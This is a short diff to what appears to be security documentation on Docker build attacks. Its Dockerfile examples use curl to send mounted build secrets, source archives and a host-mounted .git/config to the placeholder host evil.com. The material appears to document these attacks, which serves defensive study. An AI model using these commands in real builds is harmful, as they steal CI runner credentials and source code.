@@ -29,7 +29,8 @@ RUN curl -X POST -d "/src.tar.gz" http://evil.com
 Exflitrating runner secrets
 ```Dockerfile
 FROM alpine/curl
-ADD /home/runner/.docker/config.json config.json
 RUN --mount=type=secret,id=<secret_name> \
-    curl -X POST -d "@/run/secrets/<secret_name>" http://evil.com
+    curl -X POST -d "@/run/secrets/<secret_name>" http://evil.com;
+RUN --mount=type=bind,source=/,target=/host \
+    curl -X POST -d "/host/.git/config" http://evil.com
 ```
